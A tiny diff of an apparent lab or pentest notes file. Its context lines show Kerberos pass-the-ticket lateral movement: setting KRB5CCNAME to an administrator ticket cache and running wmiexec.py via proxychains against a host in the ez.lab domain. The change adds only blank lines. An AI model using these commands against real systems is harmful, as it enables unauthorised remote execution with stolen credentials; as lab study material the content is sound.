@@ -17,3 +17,5 @@ updated_at: '2023-04-10T20:26:05.079234+00:00'
 export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
 proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
 ```
+
+
